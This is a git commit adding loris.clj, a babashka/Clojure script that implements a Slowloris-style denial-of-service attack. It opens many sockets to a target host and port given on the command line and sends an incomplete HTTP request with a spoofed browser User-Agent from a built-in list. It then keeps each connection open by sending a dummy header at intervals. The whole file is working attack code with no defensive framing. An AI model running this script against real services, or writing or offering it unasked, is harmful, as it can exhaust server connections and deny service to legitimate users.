94f30b659e92983cc8f1b1547f062f768d33894b
Rahul De <rahul080327@gmail.com>
2023-03-18 15:38:09 +0000

    [loris] loris

---
+++ loris.clj
@@ -0,0 +1,84 @@
+(require '[babashka.cli :as cli]
+         '[clojure.java.io :as io])
+
+(import '[java.net Socket]
+        '[java.util.concurrent Executors])
+
+(def user-agents
+  ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50"
+   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0"
+   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
+   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50"
+   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+   "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+   "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+   "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"
+   "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+   "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"
+   "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+   "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"
+   "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+   "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"])
+
+(defn send-header
+  [k v]
+  (println (str k ": " v)))
+
+(defn connect
+  [host port interval sock-timeout]
+  (let [sock (doto (Socket. host port)
+               (.setSoTimeout sock-timeout))
+        out (io/writer sock)]
+    (println "Created socket")
+    (binding [*out* out]
+      (println (str "GET /?" (rand-int 2000) " HTTP/1.1"))
+      (send-header "User-Agent" (rand-nth user-agents))
+      (send-header "Accept-language" "en-US,en,q=0.5")
+      {:out out
+       :sock sock
+       :fut (future
+              (loop []
+                (send-header "X-a" (rand-int 5000))
+                (.println System/out (str "Sent header, sleeping for: " interval))
+                (Thread/sleep interval)
+                (recur)))})))
+
+(defn loris
+  [{{:keys [host port connections interval sock-timeout]} :opts}]
+  (let [socks (doall (take connections (repeatedly #(connect host port interval sock-timeout))))]
+    (Thread/sleep 10000)
+    (run! (fn [{:keys [out sock fut]}]
+            (future-cancel fut)
+            (.close out)
+            (.close sock))
+          socks)))
+
+(when (= *file* (System/getProperty "babashka.file"))
+  (set-agent-send-off-executor! (Executors/newVirtualThreadPerTaskExecutor))
+
+  (loris (cli/parse-args *command-line-args*
+                         {:require [:host :port]
+                          :coerce {:port :long
+                                   :connections :long
+                                   :interval :long}
+                          :exec-args {:connections 10
+                                      :interval 2000
+                                      :sock-timeout 4000}})))
+
+(comment
+  (set-agent-send-off-executor! (Executors/newVirtualThreadPerTaskExecutor))
+
+  (loris {:opts {:host "localhost"
+                 :port 8000
+                 :connections 5}}))
